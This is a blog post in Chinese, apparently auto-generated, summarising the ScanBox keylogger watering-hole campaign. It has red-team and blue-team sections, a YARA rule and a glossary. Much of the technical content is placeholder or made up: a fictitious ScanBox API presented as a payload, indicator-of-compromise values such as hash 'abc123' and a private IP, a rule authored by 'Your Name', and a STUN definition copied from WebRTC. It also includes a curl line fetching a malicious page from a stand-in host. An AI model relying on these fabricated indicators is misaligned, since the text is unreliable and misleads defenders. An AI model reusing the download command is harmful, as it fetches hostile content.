---
layout: post
title:  "Watering Hole Attacks Push ScanBox Keylogger"
date:   2026-01-16 14:12:13 +0000
categories: [security]
---

# 🚨 解析 ScanBox 攻擊框架：中國基礎威脅演員的水坑攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Keylogger 和瀏覽器指紋收集
> * **關鍵技術**: `ScanBox`, `JavaScript`, `WebRTC`, `STUN`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ScanBox 攻擊框架利用 JavaScript 和 WebRTC 技術收集用戶的瀏覽器指紋和鍵盤輸入。
* **攻擊流程圖解**:
  1. 用戶點擊惡意連結，導向一個包含 ScanBox 代碼的網頁。
  2. ScanBox 代碼執行，收集用戶的瀏覽器指紋和鍵盤輸入。
  3. 收集到的資料傳送給攻擊者的伺服器。
* **受影響元件**: 所有支持 WebRTC 的瀏覽器，包括 Google Chrome、Mozilla Firefox 和 Microsoft Edge。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要一個包含 ScanBox 代碼的網頁和一個伺服器來收集資料。
* **Payload 建構邏輯**:
  ```javascript
  // ScanBox 代碼範例
  var scanbox = new ScanBox();
  scanbox.init();
  scanbox.start();
  ```
  *範例指令*: 使用 `curl` 命令下載惡意網頁並執行 ScanBox 代碼。
  ```bash
  curl -s -o scanbox.html http://example.com/scanbox.html
  ```
* **繞過技術**: 攻擊者可以使用各種技術來繞過防禦，例如使用代理伺服器或 VPN 來隱藏 IP 地址。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:
  | 類型 | 值 |
  | --- | --- |
  | Hash | `abc123` |
  | IP | `192.168.1.100` |
  | Domain | `example.com` |
  | File Path | `/tmp/scanbox.html` |
* **偵測規則 (Detection Rules)**:
  ```yara
  rule ScanBox_Detection {
    meta:
      description = "ScanBox 攻擊框架偵測"
      author = "Your Name"
    strings:
      $scanbox_code = "ScanBox.init()"
    condition:
      $scanbox_code
  }
  ```
  或者是具體的 SIEM 查詢語法 (Splunk/Elastic)。
  ```spl
  index=web_logs | search "ScanBox.init()"
  ```
* **緩解措施**: 除了更新瀏覽器和操作系統之外，還可以設定防火牆和入侵偵測系統來阻止惡意流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **WebRTC (Web Real-Time Communication)**: 一種允許瀏覽器之間進行實時通信的技術，包括語音、視頻和數據傳輸。
* **STUN (Session Traversal Utilities for NAT)**: 一種允許瀏覽器之間進行實時通信的技術，包括語音、視頻和數據傳輸，尤其是在 NAT (Network Address Translation) 環境中。
* **JavaScript**: 一種用於網頁開發的腳本語言，常用於創建動態網頁和網頁應用程序。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1056/)


